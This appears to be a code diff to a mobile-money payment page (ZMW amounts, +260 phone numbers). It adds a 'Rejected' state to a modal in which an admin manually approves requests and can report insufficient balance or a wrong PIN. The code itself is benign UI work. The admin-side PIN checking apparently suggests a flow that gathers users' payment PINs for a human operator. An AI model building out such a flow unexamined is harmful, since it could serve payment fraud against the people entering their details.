@@ -364,6 +364,19 @@
     border-top-color:var(--blue);
     animation:spin 0.9s linear infinite;
   }
+  .approval-icon.error{
+    width:72px;
+    height:72px;
+    margin:0 auto 16px;
+    border-radius:50%;
+    background:#fdecea;
+    color:#d32f2f;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:2rem;
+    font-weight:900;
+  }
   .approval-title{
     margin:0 0 10px;
     font-size:1.5rem;
@@ -1237,9 +1250,10 @@
 
   <div class="approval-overlay" id="approval-modal">
     <div class="approval-card">
-      <div class="approval-spinner"></div>
-      <h3 class="approval-title">Waiting for approval</h3>
-      <p class="approval-subtitle">Your request is being reviewed by the admin. This usually takes a few moments.</p>
+      <div class="approval-spinner" id="approval-spinner"></div>
+      <div class="approval-icon error" id="approval-error-icon" style="display:none;">!</div>
+      <h3 class="approval-title" id="approval-title">Waiting for approval</h3>
+      <p class="approval-subtitle" id="approval-subtitle">Your request is being reviewed by the admin. This usually takes a few moments.</p>
       <div class="approval-summary">
         <div class="approval-summary-row"><span>Plan</span><strong id="approval-plan">Basic Plan</strong></div>
         <div class="approval-summary-row"><span>Amount</span><strong id="approval-amount">ZMW 15.00</strong></div>
@@ -1261,6 +1275,23 @@
 
   function showApprovalWaiting(){
     var modal = document.getElementById('approval-modal');
+    document.getElementById('approval-spinner').style.display = 'block';
+    document.getElementById('approval-error-icon').style.display = 'none';
+    document.getElementById('approval-title').textContent = 'Waiting for approval';
+    document.getElementById('approval-subtitle').textContent = 'Your request is being reviewed by the admin. This usually takes a few moments.';
+    document.getElementById('approval-plan').textContent = selectedPlanName;
+    document.getElementById('approval-amount').textContent = 'ZMW ' + selectedPlanPrice.toFixed(2);
+    document.getElementById('approval-phone').textContent = '+260 ' + selectedPhoneNumber;
+    document.querySelector('.content').classList.add('blurred');
+    modal.classList.add('active');
+  }
+
+  function showApprovalRejected(message){
+    var modal = document.getElementById('approval-modal');
+    document.getElementById('approval-spinner').style.display = 'none';
+    document.getElementById('approval-error-icon').style.display = 'flex';
+    document.getElementById('approval-title').textContent = 'Rejected';
+    document.getElementById('approval-subtitle').textContent = message;
     document.getElementById('approval-plan').textContent = selectedPlanName;
     document.getElementById('approval-amount').textContent = 'ZMW ' + selectedPlanPrice.toFixed(2);
     document.getElementById('approval-phone').textContent = '+260 ' + selectedPhoneNumber;
@@ -1358,13 +1389,12 @@
         if (['denied', 'insufficient', 'demo_error'].includes(data.status)) {
           clearInterval(approvalPollTimer);
           approvalPollTimer = null;
-          hideApprovalWaiting();
           var statusMessage = data.status === 'denied'
-            ? 'Approval denied.'
+            ? 'The admin rejected this request. Please review the details and try again.'
             : data.status === 'insufficient'
-              ? 'Approval marked insufficient.'
-              : 'Wrong PIN reported by admin.';
-          showPage('payment');
+              ? 'The admin marked this as insufficient balance. Please top up or use another payment method.'
+              : 'The admin reported a wrong PIN. Please re-enter the correct details.';
+          showApprovalRejected(statusMessage);
           showToast(statusMessage);
         }
       } catch (err) {
